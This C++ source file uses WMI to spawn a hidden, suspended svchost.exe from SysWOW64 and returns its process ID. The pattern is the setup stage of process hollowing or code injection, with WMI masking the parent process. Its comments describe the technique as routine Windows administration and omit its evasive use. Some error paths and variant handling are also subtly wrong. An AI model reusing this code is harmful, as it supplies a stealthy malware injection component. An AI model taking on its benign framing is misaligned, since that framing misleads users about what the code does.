#include "initialize_wmi.h"


// The Windows Management Instrumentation (WMI) is a set of extensions to the Windows Driver Model that provides an operating system interface through which instrumented components provide information and notification. WMI is Microsoft's implementation of the Web-Based Enterprise Management (WBEM) and Common Information Model (CIM) standards from the Distributed Management Task Force (DMTF).

// In your code, WMI is used to start a new instance of svchost.exe. The svchost.exe is a generic host process name for services that run from dynamic-link libraries (DLLs). The creation of svchost.exe processes is a standard part of Windows operation. Multiple instances of svchost.exe usually run at the same time. Each instance can run one or more services, and each service is a Windows component that performs specific system functions and is designed to enable the operating system to run.

// The reason why it's possible to start svchost.exe using WMI is because WMI provides a unified way for accessing management information in an enterprise environment. This includes control and management of systems, devices, applications, and services. This means that WMI can be used to start and stop services, manage system resources, and do much more.

// In the context of your code, the CreateProcess_API() function is using WMI to create a new process that runs svchost.exe. This is done in a suspended state, which means the process is created but does not immediately run. This can be useful for various reasons, such as preloading certain data or preparing the system in a certain state before the process runs.

DWORD CreateProcess_API()
{
	IWbemClassObject* oWin32Process = NULL;
	HRESULT hr;
	hr = pSvc->GetObject((BSTR)(StringToWString("Win32_Process")).c_str(), 0, NULL, &oWin32Process, NULL);
	if (FAILED(hr)) {
		pSvc->Release();
		
		return 0;
	}

	// Win32_ProcessStartup
	IWbemClassObject* oWin32ProcessStartup = NULL;
	hr = pSvc->GetObject((BSTR)(StringToWString("Win32_ProcessStartup")).c_str(), 0, NULL, &oWin32ProcessStartup, NULL);
	if (FAILED(hr)) {
		oWin32ProcessStartup->Release();
		
		return 0;
	}
	

	// Create
	IWbemClassObject* pInParamsDefinition = NULL;
	hr = oWin32Process->GetMethod((BSTR)(StringToWString("Create")).c_str(), 0, &pInParamsDefinition, NULL);
	if (FAILED(hr)) {
		oWin32Process->Release();
		
		return 0;
	}

	IWbemClassObject* pStartupInstance = NULL;
	hr = oWin32ProcessStartup->SpawnInstance(0, &pStartupInstance);
	if (FAILED(hr)) {
		oWin32ProcessStartup->Release();
		
		return 0;
	}
	

	IWbemClassObject* pParamsInstance = NULL;
	hr = pInParamsDefinition->SpawnInstance(0, &pParamsInstance);
	if (FAILED(hr)) {
		pInParamsDefinition->Release();
		
		return 0;
	}

	WCHAR wcCommandExecute[MAX_PATH + 1];

	wcscpy_s(wcCommandExecute, (StringToWString("C:\\Windows\\SysWOW64\\svchost.exe")).c_str());

	VARIANT varCommand;
	VariantInit(&varCommand);
	varCommand.vt = VT_BSTR;
	varCommand.bstrVal = wcCommandExecute;
	hr = pParamsInstance->Put((BSTR)(StringToWString("CommandLine")).c_str(), 0, &varCommand, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}

	CComVariant varCommand_ShowWindow;
	varCommand_ShowWindow = SW_HIDE;
	hr = pStartupInstance->Put((BSTR)(StringToWString("ShowWindow")).c_str(), 0, &varCommand_ShowWindow, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}
	
	// Here, the CREATE_SUSPENDED flag is set for the CreateFlags property of the Win32_ProcessStartup instance (pStartupInstance). This flag indicates that the new process should be created in a suspended state, meaning it does not run until explicitly resumed. This is a standard feature of the Windows API for process creation, and it's useful in scenarios where you might want to modify the state of the process or its threads before it begins execution.
	CComVariant varCreateFlags(CREATE_SUSPENDED);
	hr = pStartupInstance->Put(CComBSTR((StringToWString("CreateFlags")).c_str()), 0, &varCreateFlags, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}


	VARIANT vtDispatch;
	VariantInit(&vtDispatch);
	vtDispatch.vt = VT_DISPATCH;
	vtDispatch.byref = pStartupInstance;
	hr = pParamsInstance->Put((BSTR)(StringToWString("ProcessStartupInformation")).c_str(), 0, &vtDispatch, 0);
	if (FAILED(hr)) {
		pParamsInstance->Release();
		
		return 0;
	}

	IWbemClassObject* pOutParams = NULL;
	hr = pSvc->ExecMethod((BSTR)(StringToWString("Win32_Process")).c_str(), (BSTR)(StringToWString("Create")).c_str(), 0, NULL, pParamsInstance, &pOutParams, NULL);
	if (FAILED(hr)) {
		pSvc->Release();
		
		return 0;
	}

	VARIANT pid;
	CIMTYPE pid_type(CIM_UINT32);

	// collect PID
	if (FAILED(pOutParams->Get(CComBSTR((StringToWString("ProcessId")).c_str()), 0, &pid, &pid_type, NULL)))
	{
		return 0x0;
	}

	DWORD ppid = (DWORD)V_I4(&pid);
	 

	pParamsInstance->Release();
	oWin32Process->Release();
	oWin32ProcessStartup->Release();
	pStartupInstance->Release();

	return ppid;
}
